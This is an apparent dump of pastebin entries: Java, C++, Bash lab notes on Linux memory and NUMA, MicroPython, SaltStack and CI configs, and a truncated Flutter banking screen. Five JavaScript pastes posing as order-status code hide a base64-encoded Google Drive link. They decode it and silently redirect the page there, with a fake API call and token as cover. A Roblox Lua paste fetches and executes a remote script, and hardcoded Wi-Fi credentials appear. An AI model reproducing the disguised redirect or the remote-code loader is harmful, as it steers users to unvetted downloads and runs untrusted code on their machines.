id,title,username,language,date,content
AUZ8G3mY,Untitled,KInddoo,JavaScript,Thursday 29th of May 2025 07:08:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07565/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pyPzp1qm,Products.js,KInddoo,JavaScript,Thursday 29th of May 2025 06:35:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26958/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eVUNXb0T,Order.js,KInddoo,JavaScript,Thursday 29th of May 2025 06:30:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97229/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yvRugTyX,Market.js,KInddoo,JavaScript,Thursday 29th of May 2025 06:24:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27648/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WvzZeWQc,Untitled,thewitchking,Java,Thursday 29th of May 2025 06:23:12 AM CDT,"import java.util.*;
class Main {
    
    public List<List<Character>> subsets(String s) {
        List<List<Character>> list = new ArrayList<>();
        char [] c = s.toCharArray();
        backtrack(list, new ArrayList<>(), c, 0);
        return list;
    }

    private void backtrack(List<List<Character>> list , List<Character> tempList, char [] cs, int start){
        if(!tempList.isEmpty())
            list.add(new ArrayList<>(tempList));
        for(int i = start; i < cs.length; i++){
            tempList.add(cs[i]);
            backtrack(list, tempList, cs, i + 1);
            tempList.remove(tempList.size() - 1);
        }
    }
    public static void main(String[] args) {
        System.out.println(new Main().subsets(""xyz""));
    }
}"
vLZqFXKT,Untitled,KInddoo,JavaScript,Thursday 29th of May 2025 06:19:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69584/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dXm3qqkm,uzupelnienie - do usuniecia,dadix102,Bash,Thursday 29th of May 2025 06:02:34 AM CDT,"echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.12]-----------------------------------------------------------------------------\033[0m
\033[0;32mVSZ\033[0m - rozmiar stron [KiB]
rozmiar wszystkich przydzielonych dla procesu stron (w KiB) (cała pamięć, do której proces ma dostęp, czyli
pamięć wymieciona + pamięć zaalokowana + pamięć bibliotek współdzielonych + pamięć plików wykonywalnych)
 
\033[0;32mRSZ\033[0m - rozmiar ramek [KB]
rozmiar wszystkich przydzielonych dla procesu ramek z jego stronami (w KB) (nie uwzględnia SWAP, ale
uwzględnia pamięć bibliotek współdzielonych, czyli pokazuje tylko stan aktualny ramek w pamięci fizycznej)
 
\033[0;32mStrona jest ladowana do ramki\033[0m (czyli fizycznej strony pamieci) w momencie, gdy proces potrzebuje dostepu do danego obszaru pamieci wirtualnej,
ktory nie jest obecnie obecny w pamieci fizycznej.\n
 
\033[0;32mnie kazda\033[0m strona jest przechowywana w ramce tego procesu\n
gdy proces odwoluje sie do strony pamieci ktorej nie ma w zadnej z jego ramek \033[0;32mwystapi blad strony\033[0m
\033[0;32mkolejnosc odszukiwania strony\033[0m - poza zbiorem roboczym, (gdy wystapi \033[0;32mblad strony\033[0m):
\033[0;32m1.\033[0m swap cache - jesli znajdzie to blad poboczny, aktualizacja zbioru roboczego, pozniej tablicy
stron
\033[0;32m2.\033[0m przestrzeni wymiany swap
\033[0;32m3.\033[0m plik regularny tego programu lub biblioteki
 
\033[0;32mStrona jest ladowana do ramki\033[0m w momencie, gdy program probuje uzyskac dostep do tej strony.

To co proces ma w segmentach to jego pamięć wirtualna, każdy segment jest podzielony na strony. Te ze stron, które są
załadowane do ramek to jego rzeczywista fizyczna pamięć ulotna. Strony, które nie są w ramkach, znajdują się w
plikach regularnych programu lub bibliotekach, wykorzystywanych przez proces. Strona. która jest niepotrzebna dla
procesu zmienia oznaczenie na nieaktywną i jej właścicielem zostaje swap cache.

\033m Bedy glowne maj_flt blad glowny strona nie należy do zadnej ramki
\033
\033m Blad poboczny min_flt poboczny należy do ramki ale nie należy do obszaru roboczego procesu 
co to obszar roboczy -  zbior ramek\033
""

echo bfq > /sys/block/sda/queue/scheduler
time perf sched record ionice -c 1 -n 0 stress -i 1 -t 240


ps -o pid,cmd,maj_flt,min_flt $(pidof stress)
ps -o pid,vsz,rsz $(pidof stress -s) | grep --color -E ""VSZ|RSZ|$""


 echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.24]-----------------------------------------------------------------------------\033[0m
    Należy regularnie kontrolować stan dostępnej pamięci operacyjnej (mem \033[0;32mused\033[0m i \033[0;32mavailable\033[0m) oraz ile mamy wykorzystanej
    pamięci swap (ilosc wolnych ramek w pamieci, zajetosc przestrzeni wymiany swap)
 
    Jeśli posiadamy mało wolnej ulotnej pamięci fizycznej (available) oraz mało wolnej pamięci przestrzeni wymiany (free),
    możemy spodziewać się podjęcia przez system operacyjny odpowiednich kroków
    
    \033[0;32mW przypadku presji pamieci\033[0m (kiedy brakuje ramek) system stosuje:
    \033[0;32m1.\033[0m wymiatanie stron.
    \033[0;32m2.\033[0m redukcja zbioru roboczego procesu - odebranie czesci przydzielonych procesom ramek
    \033[0;32m3.\033[0m procedura OOM (Out of Memory) - wybierane sa procesy, ktore zostana natychmiast zakonczone
    
    Aby procedura OOM nie była zastosowana możemy:
    \033[0;32m- powiekszyc przestrzen wymiany\033[0m poprzez dodanie pliku wymiany (ale tylko w Linuxie, w Windowsie nie można, bo trzeba by było restartować system
    \033[0;32m- zakonczyc procesy\033[0m, które są nam już niepotrzebne, dzięki czemu będziemy mieli kontrolę nad procesami, które zostaną zamknięte
    \033[0;32m- zapisać stan procesów\033[0m na dysku.
    
    Dlatego też instalowanie systemu bez przestrzeni wymiany swap jest złym pomysłem, ponieważ bez magazynów stron
    przyspierzymy wystąpienie procedury OOM.
 
    \033[0;32mfree\033[0m - rozmiar wolnej pamieci ulotnej(operacyjnej) ale bez ramek z przestrzeni swap cache (NIE UZYWANA PRZEZ ZADEN URUCHOMIONY PROCES,
        GOTOWA DO ALOKACJI DLA NOWEGO PROCESU)
 
    \033[0;32mAvailable\033[0m - rozmiar wolnych ramek wraz z ramkami z swap-cache, ktore zawieraja niezabrudzone i nieanonimowe strony
    
    pokaze wartosc free(mem)(rozmiar wolnych ramek) + ramki ze swap cache NIEZABRUDZONE I NIEANONIMOWE strony + z buforow te zabrudzone
 
    SZACUJE ILOSC PAMIECI MOZLIWA DO PRZYDZIELENIA NOWEMU PROCESOWI, BIERZE POD UWAGE BUFORY I CACHE, KTORE MOGA ZOSTAC ZWOLNIONE PRZEZ INNE PROCESY W RAZIE POTRZEBY
""
 
    free -wh | grep --color -E ""free|used|$""






1:
echo -e ""\033[0;32m-------------------------------------------------------[4.1.2.21]-----------------------------------------------------------------------------\033[0m""


2:
lscpu
numactl --cpunodebind=2 --membind=2 leafpad


1:
pidof leafpad
ps -o pid,nlwp -p $(pidof leafpad)
numastat -p $(pidof leafpad)
numactl -H
taskset -c -a -p $(pidof leafpad)

#uma - zasoby nie dziela się na wezly
#numa - zasoby dziela się na wezly zawierające pewny obszar pamięci operacyjnej i jednostki przetwarzające. Jest to korzystniejsze ponieważ przetwarzanie w ramach jednego wezla jest szybsze


echo -e ""Maska przypisana zgadza się z przypisanymi CPU do tego węzła (6-9) – widać, że nastąpiło ograniczenia zasobów
 
\033[0;32mNUMA\033[0m to architektura komputerów charakteryzująca się podziałem na węzły, które dysponują jednostkami przetwarzającymi i
ciągła przestrzenią pamięci ulotnej RAM
 
*Obowiązująca polityka NUMA oraz reguły koligacji są zawsze nadrzędne do ustalonej polityki szeregowania*
\033[0;32mNUMA > koligacja > priorytet statyczny > polityka szeregowania > priorytet zewnętrzny nice\033[0m
 
\033[0;32m#P\033[0m Co jeżeli reguły koligacji mówią że proces może korzystać z drugiego CPU a należy do węzła NUMA który nie zawiera tej
jednostki przetwarzającej?
- nie dostanie wtedy przydziału jednostki przetwarzającej ponieważ NUMA jest nadrzędna
NUMASTAT
- Huge - zakres dużych stron (mogą zajmować 2MiB)
- Heap - sterta
- Stack - stos
- Private - strony anonimowe (segment składa się ze stron)
Tablica TLB - przechowywane są ostatnio transformowane adresy stron z logicznych na fizyczne gdy odwołamy się do adresu
strony której nie ma zostanie ona przetransformowane.
Tablica stron - Zawiera numery ramek odpowiadające numerom stron
 
\033[0;32m#P\033[0m Skąd wiadomo, że ten proces korzystał z pamięci ulotnej, zlokalizowanej w tym ostatnim węźle?
- anonimowe segmenty pamięci - stos i stertę lokalizował w pamięci węzła nr 2. (pokazać niezerowe wartości po wykonaniu
polecenia numastat -p <PID>
 
\033[0;32m#P\033[0m Skąd wiadomo że to jednostki z ostatniego węzła?
- z polecenia numactl -H widać node 2 cpus: 6 7 8 9
 
\033[0;32m#P\033[0m Jakie zasoby przynależą do węzłów NUMA?
- jednostki przetwarzające i obszar pamięci ulotnej
""





echo -e ""\033[0;32m-------------------------------------------------------[4.1.2.22]-----------------------------------------------------------------------------\033[0m""

lscpu | grep NUMA

numademo 100M memset #może być 350M jak będzie dzialalo

#pokazuje:
#memory on node 1 memset Avg 17118
#dla
#memory interleaved on 0 1 2 memset Avg 16651

#przekaz danych poprzez szyne interconnect powoduje opóźnienie w przetwarzaniu

"
DgCV8MJC,dataNone,TestGuy1,JSON,Thursday 29th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '0df19224c60896023fec62661e381ab4612a59638c4010a500e471484a02c75576b46fa955eada663b17185092c2d028635ef0da84d50a2f98ec8b621d43622b76b163c4b5f63ec76584512c5cd98966d3cfcf829cf7ca1026935a6ed7427eaa8bfe5715ab2dbfbebdc97352b862c95a75e23da7e85d4b669e69050e5b8b1d07',
  otherdata: [
    'e1244e51e554b3906c7bd85404094710',
    'cac2159116153fde6e9434aadcbc7758',
    'caaafafe62b5446faa821ea5510ef510',
    'b41569182382709813d62a3ceef28f77',
    '609d82b6868825ebfe1012c375bd588a',
    'e9a3eddd643268fb7bc626ab59c79729',
    '9b222d11cbfcf8fd9cc8361864b2d968',
    '9f9b08d34d2d779f17685e18e9023ab5'
  ]
}"
RuFqsCYR,grow a fish pond,new2479,Lua,Thursday 29th of May 2025 05:59:41 AM CDT,"--https://www.youtube.com/@WinPo1R              pls sub 
--discord :      https://discord.gg/mdnJJYbjCh
 
 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/powin273/script/refs/heads/main/Grow_a_Fish_Pond.lua"", true))()"
4MDcr4Kc,wifu_menu.py,orborbson,Python,Thursday 29th of May 2025 05:57:26 AM CDT,"import wifu, machine, socket
from micropython import const

state = None
led_on = const(1)
led_off = const(0)
sleep_ds = const(10)

def web_page():
    global state, led
    
    if state == 'on':
        led.value(led_on)
    elif state == 'off':
        led.value(led_off)
    elif state == 'ds':
        wifu.wlan.off()
        machine.deepsleep(sleep_ds * 1000)
    
    html = f'''<!DOCTYPE html>
    <html lang=""pl"">

    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>Sterowanie</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                margin-top: 50px;
                background-color: #f4f4f4;
            }}

            h1 {{
                color: #333;
            }}

            p {{
                font-size: 1.2em;
                color: #555;
            }}

            .button {{
                display: inline-block;
                padding: 15px 30px;
                margin: 10px;
                font-size: 1.2em;
                font-weight: bold;
                color: #fff;
                text-decoration: none;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                transition: background-color 0.3s;
            }}

            .button.on {{
                background-color: #4CAF50;
            }}

            .button.on:hover {{
                background-color: #45a049;
            }}

            .button.off {{
                background-color: #f44336;
            }}

            .button.off:hover {{
                background-color: #d32f2f;
            }}

            .button.deepsleep {{
                background-color: #8c0dc2;
            }}

            .button.deepsleep:hover {{
                background-color: #6b0b93;
            }}
        </style>
    </head>

    <body>
        <h1>{wifu.hostname}</h1>
        <p>Stan: {state}</p>
        
        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""on"" class=""button on"">Włącz</button>
        </form>

        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""off"" class=""button off"">Wyłącz</button>
        </form>
        <br>
        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""deepsleep"" class=""button deepsleep"">głęboki sen ({sleep_ds} sek)</button>
        </form>
    </body>

    </html>
    '''
    return html

led = machine.Pin(2, machine.Pin.OUT, value=led_off)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 80))
s.listen(5)

while True:
    gc.collect()
    conn, addr = s.accept()
    request = conn.recv(1024)
    request_str = request.decode()
    redirect = False
    
    if 'GET /?relay=on HTTP' in request_str:
        state = 'on'
        redirect = True
    elif 'GET /?relay=off HTTP' in request_str:
        state = 'off'
        redirect = True
    elif 'GET /?relay=deepsleep HTTP' in request_str:
        state = 'ds'
        redirect = True
    
    if redirect:
        conn.send('HTTP/1.1 302 Found\r\nLocation: /\r\nConnection: close\r\n\r\n')
    else:
        response = web_page()
        conn.send('HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n')
        conn.sendall(response)
    conn.close()"
2U96nzjR,wifu.py,orborbson,Python,Thursday 29th of May 2025 05:55:48 AM CDT,"import sys, network, time

class wifix:
    def __init__(self, ssid, passwd):
        self.ssid = ssid
        self.passwd = passwd
        self.wlan = network.WLAN(network.WLAN.IF_STA)
        self.wlan.active(True)
        self.wlan.config(dhcp_hostname=""esp32"")
        
    def find(self, wait = 3):
        while True:
            for net in self.wlan.scan():
                if net[0].decode() == self.ssid:
                    sys.stdout.write(f'[INFO]: znaleziono ""{self.ssid}""\n')
                    return
            time.sleep(wait)
    
    def connect(self, wait = 1):
        if not self.wlan.isconnected():
            self.wlan.connect(self.ssid, self.passwd)
            while not self.wlan.isconnected():
                time.sleep(wait)
            sys.stdout.write(f'[INFO]: połączono z ""{self.ssid}"", IP: {self.wlan.ifconfig()[0]}\n')
        else:
            sys.stdout.write(f'[INFO]: już połączony z ""{self.ssid}"", IP: {self.wlan.ifconfig()[0]}\n')
            
    def off(self):
        self.wlan.active(False)
        time.sleep(1)
    
    @property        
    def hostname(self):
        return self.wlan.config(""dhcp_hostname"")

wlan = wifix('wifu', 'haslo123')
wlan.find()
wlan.connect()
hostname = wlan.hostname"
r2SS1j0Q,Untitled,konstest,YAML,Thursday 29th of May 2025 05:41:20 AM CDT,".no-web-no-mr: &no-web-no-mr
  if: '$CI_PIPELINE_SOURCE == ""web"" || $CI_PIPELINE_SOURCE == ""merge_request_event""'
  when: never

.no-mr: &no-mr
  if: '$CI_PIPELINE_SOURCE == ""merge_request_event""'
  when: never

workflow:
  # convert master branch name to base saltenv
  rules:
    - if: $CI_COMMIT_BRANCH == ""master""
      variables:
        SALTENV: saltenv=base pillarenv=base
    - variables:
        SALTENV: saltenv=""$CI_COMMIT_BRANCH"" pillarenv=""$CI_COMMIT_BRANCH""
    - <<: *no-mr

.manual-without-duplicate-pipelines:
  rules:
    - <<: *no-mr
    - when: manual
      # let the jobs be skipped, since rules force allow_failure to be false
      # https://docs.gitlab.com/13.12/ee/ci/yaml/index.html#allow_failure
      allow_failure: true

.salt-master:
  image: docker:latest
  extends:
    - .manual-without-duplicate-pipelines
  tags:
    - devops-ci-master.build.company.ru
  #  before_script:
  #    - sleep 10; echo ""Timer for salt-master gitfs git pull scheduler""
  variables:
    MASTER: docker exec -i devops-ci-master
  dependencies: []

#
# Autosyncing pillars & salt modules to ALL servers
saltutil.sync_all to ALL servers:
  stage: salt-master-last-stage
  rules:
    - <<: *no-web-no-mr
    - if: '$CI_COMMIT_REF_NAME == ""master"" && $CI_PIPELINE_SOURCE != ""trigger""'
      changes:
        - pillar/**/*
        - salt/_*/*
      when: on_success
      allow_failure: true
  extends:
    - .salt-master
  script:
    - $MASTER salt -C ""*"" saltutil.sync_all || true

branch $COMMAND on $TARGET:
  stage: salt-master
  extends:
    - .salt-master
  script:
    - $MASTER salt -C ""$TARGET"" saltutil.refresh_grains || true
    - $MASTER salt -C ""$TARGET"" saltutil.refresh_pillar || true
    - echo salt -C ""$TARGET"" $COMMAND $SALTENV
    - $MASTER salt -C ""$TARGET"" $COMMAND $SALTENV

branch async $COMMAND on $TARGET:
  stage: salt-master
  extends:
    - .salt-master
  script:
    - echo salt -C ""$TARGET"" $COMMAND $SALTENV
    - jid=$($MASTER salt -C ""$TARGET"" $COMMAND $SALTENV --async | cut -d' ' -f6)
    - while [ ""$($MASTER salt-run jobs.active | grep $jid)"" != '' ]; do echo waiting executing $jid command':' salt -C ""$TARGET"" $COMMAND $SALTENV; done;
    - $MASTER salt-run jobs.lookup_jid jid=$jid missing=False returned=True
    - $MASTER salt-run jobs.lookup_jid jid=$jid missing=True returned=False"
qaN4q2FE,Painting Fence 448C Codeforces,Fastrail08,C++,Thursday 29th of May 2025 05:38:33 AM CDT,"//QUESTION - https://codeforces.com/problemset/problem/448/C
// TODO - MEMO/DP..recursive solution written
#include <bits/stdc++.h>
using namespace std;

void getMinimumStrokes(int level, long long strokes, long long &minStrokes, vector<int> &fence){
    if(level >= fence.size()){
     minStrokes = min(minStrokes, strokes);  
     return;
    }
    
    // If section is already painted, move to the next section
    if(fence[level] == 0){
        getMinimumStrokes(level + 1, strokes, minStrokes, fence);
    }
    
    // Else we have 2 ways of painting (H, V);
    else{
        //horizontal stroke
        int paintedTill = -1;
        for(int i = level; i < fence.size(); i++){
            if(fence[i] == 0){
                break;
            }
            paintedTill = i;
            fence[i]--;
        }
        getMinimumStrokes(level, strokes + 1, minStrokes, fence);
        // backtrack to previous state where horizontal stroke didn't happen
        int actualRangePainted = paintedTill == -1 ? fence.size() - 1: paintedTill;
            if(paintedTill != -1){
                for(int i = level; i <= paintedTill; i++){
                fence[i]++;
            }
        }
        
        //vertical stroke
        int currUnpaintedFence = fence[level];
        fence[level] = 0;
        getMinimumStrokes(level + 1, strokes + 1, minStrokes, fence);
        fence[level] = currUnpaintedFence;
    }
}

int main() {
	// your code goes here
    int n;
    cin >> n;
    vector<int> fence(n);
    for(int i = 0; i < n; i++){
        cin >> fence[i];
    }
    long long minStrokes = INT_MAX;
    getMinimumStrokes(0, 0, minStrokes, fence);
    cout << minStrokes << '\n';
}
"
69tppax2,Untitled,konstest,YAML,Thursday 29th of May 2025 05:28:08 AM CDT,"# cat /etc/salt/master.d/gitfs.conf

state_output: changes
#ipc_write_buffer: 'dynamic'

# https://docs.saltstack.com/en/latest/topics/pillar/#master-provided-pillar-error
pillar_safe_render_error: False

worker_threads: 48
fileserver_backend:
  - gitfs
 
default_top: master
id: devops-ci-master.build.company.ru
gitfs_base: master
gitfs_provider: pygit2
gitfs_global_lock: False
git_pillar_global_lock: False
gitfs_pubkey: /opt/PublicReader.pub
gitfs_privkey: /opt/PublicReader
 
gitfs_remotes:
  - git@gitlab.company.com:scm/DevopsPrivate-SaltStack.git:
    - name: Private_salt_states
    - base: master
    - root: salt/states
    - pubkey: /opt/DevopsPrivateReader.pub
    - privkey: /opt/DevopsPrivateReader
    - update_interval: 15
  - git@gitlab.company.com:scm/DevopsPrivate-SaltStack.git:
    - name: Private_salt
    - base: master
    - root: salt
    - pubkey: /opt/DevopsPrivateReader.pub
    - privkey: /opt/DevopsPrivateReader
    - update_interval: 15
  - git@gitlab.company.com:scm/Public-SaltStack.git:
    - name: Public_formulas_states
    - base: master
    - root: formulas/states
    - update_interval: 15
    - fallback: master
  - git@gitlab.company.com:scm/Public-SaltStack.git:
    - name: Public_formulas
    - base: master
    - root: formulas
    - update_interval: 15
    - fallback: master


ext_pillar:
  - git:
    - __env__ git@gitlab.company.com:scm/DevopsPrivate-SaltStack.git:
      - root: pillar
      - pubkey: /opt/DevopsPrivateReader.pub
      - privkey: /opt/DevopsPrivateReader

git_pillar_update_interval: 15
git_pillar_base: master
state_top_saltenv: base
pillar_source_merging_strategy: none
top_file_merging_strategy: same
gather_job_timeout: 30
pillarenv_from_saltenv: true
sock_pool_size: 30"
tNW7Lrb3,pallet generator,mactech24,Dart,Thursday 29th of May 2025 05:04:21 AM CDT,"// ignore_for_file: avoid_unnecessary_containers, sized_box_for_whitespace

import 'package:flutter/material.dart';
import 'package:flutter_phosphor_icons/flutter_phosphor_icons.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:hooks_riverpod/hooks_riverpod.dart';
import 'package:monita/router/app_router.dart';
import 'package:monita/screens/Transfer/sendMoney/widget/send_money_model.dart';
import 'package:monita/utils/utils_size.dart';
import 'package:monita/widgets/appbar.dart';
import 'package:monita/widgets/global_widgets.dart';
import 'package:monita/widgets/icon_widget.dart';
import 'package:palette_generator/palette_generator.dart';
import '../../../constants/constants.dart';
import '../../../controller/general_provider.dart';

class SendMoneyScreen extends StatefulWidget {
  const SendMoneyScreen({super.key});
  static String routeName = ""/sendMoneyScreen"";

  @override
  _SendMoneyScreenState createState() => _SendMoneyScreenState();
}

class _SendMoneyScreenState extends State<SendMoneyScreen> {
  @override
  Widget build(BuildContext context) {
    SizeConfig().init(context);
    Size size = MediaQuery.of(context).size;
    return Consumer(
      builder: (_, ref, __) {
        return Scaffold(
          backgroundColor:
              ref.watch(generalNotifierProvider) ? lightBlack : darkLemond2,
          appBar: AppBar(
            backgroundColor:
                ref.watch(generalNotifierProvider) ? lightBlack : darkLemond2,
            surfaceTintColor: transparent,
            automaticallyImplyLeading: false,
            elevation: 0,
            title: Column(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                appBar1(context, sendMoneyToText,
                    titleColor:
                        ref.watch(generalNotifierProvider) ? white : white),
              ],
            ),
            centerTitle: true,
          ),
          body: Column(
            children: [
              verticalSpace(getProportionateScreenHeight(20)),
              Padding(
                padding: EdgeInsets.symmetric(
                  horizontal: getProportionateScreenWidth(15),
                ),
                child: buildSearchField(
                  borderColor: transparent,
                  background: ref.watch(generalNotifierProvider)
                      ? primaryBaseDarkmode
                      : const Color(0xFF5e6c0b),
                  hintText: ""Search Bannk or Beneficiary"",
                  prifixIconColor: ref.watch(generalNotifierProvider)
                      ? white.withOpacity(0.72)
                      : white.withOpacity(0.72),
                  hintTextColor: ref.watch(generalNotifierProvider)
                      ? white.withOpacity(0.72)
                      : white.withOpacity(0.72),
                  textColor: ref.watch(generalNotifierProvider)
                      ? white.withOpacity(0.72)
                      : white.withOpacity(0.72),
                  onChanged: (value) {},
                ),
              ),
              verticalSpace(getProportionateScreenHeight(20)),
              Expanded(
                child: Container(
                  width: size.width,
                  decoration: BoxDecoration(
                      color: ref.watch(generalNotifierProvider)
                          ? primaryBaseDarkmode
                          : white,
                      borderRadius: const BorderRadius.vertical(
                        top: Radius.circular(30),
                      )),
                  child: const SendMoneyContent(),
                ),
              )
            ],
          ),
        );
      },
    );
  }
}

class SendMoneyContent extends StatelessWidget {
  const SendMoneyContent({super.key});

  @override
  Widget build(BuildContext context) {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        const RecentBeneficiaries(),
        const SizedBox(height: 16),
        BankListSection(),
      ],
    );
  }
}

class RecentBeneficiaries extends StatefulWidget {
  const RecentBeneficiaries({
    super.key,
  });

  @override
  State<RecentBeneficiaries> createState() => _RecentBeneficiariesState();
}

class _RecentBeneficiariesState extends State<RecentBeneficiaries> {
  Color backgroundColor = Colors.grey.shade200;
  final List<BeneficiaryBank> beneficiaryList = [
    const BeneficiaryBank(
      firstName: ""Macsmith"",
      lastName: ""Okorie"",
      imagePath: ""assets/banks/firstbank.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Emmanuel"",
      lastName: ""Omobude"",
      imagePath: ""assets/banks/paycom.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Toheeb"",
      lastName: ""Asuwanju"",
      imagePath: ""assets/banks/stanbic-ibtc-bank.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Musa"",
      lastName: ""Babalola"",
      imagePath: ""assets/banks/jaiz-bank.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Tola"",
      lastName: ""Timothy"",
      imagePath: ""assets/banks/suntrust-bank.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Mary"",
      lastName: ""Bisola"",
      imagePath: ""assets/banks/gtb.png"",
    ),
    const BeneficiaryBank(
      firstName: ""Tola"",
      lastName: ""Timothy"",
      imagePath: ""assets/banks/sterling-bank.png"",
    ),
  ];

  @override
  void initState() {
    super.initState();
    _updatePalette();
  }

  Color lightenColor(Color color, [double amount = 0.3]) {
    final hsl = HSLColor.fromColor(color);
    final lightened =
        hsl.withLightness((hsl.lightness + amount).clamp(0.0, 1.0));
    return lightened.toColor();
  }

  Future<void> _updatePalette() async {
    final imageProvider = AssetImage(beneficiaryList[0].imagePath);

    final paletteGenerator = await PaletteGenerator.fromImageProvider(
      imageProvider,
